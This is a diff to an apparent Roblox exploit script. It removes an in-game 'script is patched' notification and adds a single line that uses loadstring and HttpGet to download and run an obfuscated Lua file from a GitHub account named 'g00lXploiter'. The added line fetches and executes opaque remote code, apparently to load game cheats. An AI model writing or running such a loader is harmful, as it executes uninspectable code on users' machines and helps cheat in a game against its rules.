@@ -1,5 +1,1 @@
-game:GetService("StarterGui"):SetCore("SendNotification", { 
-        Title = "Ramzz";
-        Text = "YK What?, The Script Is Fucking Patched AGAIN!!!, I Will Fix The Script Soon🥱";
-        Icon = "rbxthumb://type=Asset&id=15992568695&w=150&h=150"})
-    Duration = 11;
+loadstring(game:HttpGet("https://raw.githubusercontent.com/g00lXploiter/g00lXploiter/main/obf_N7lbcy139lSd9t6Mo70v6A55be48M1JzdLu0NpefSbeFLFX24U44x8401Q4xRhDp.lua.txt"))()
